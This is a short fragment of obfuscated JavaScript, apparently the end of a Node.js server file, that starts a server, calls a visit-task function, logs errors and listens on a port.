AddVisitTask();}catch(_0x4629ac){console[_0x136942(0xa9)]('Error\x20in\x20startserver:',_0x4629ac);}}startserver()[_0xa0b551(0xbe)](_0x64c235=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x64c235);}),app[_0xa0b551(0xa3)](PORT,()=>console[_0xa0b551(0xef)](_0xa0b551(0x13f)+PORT+'!'));
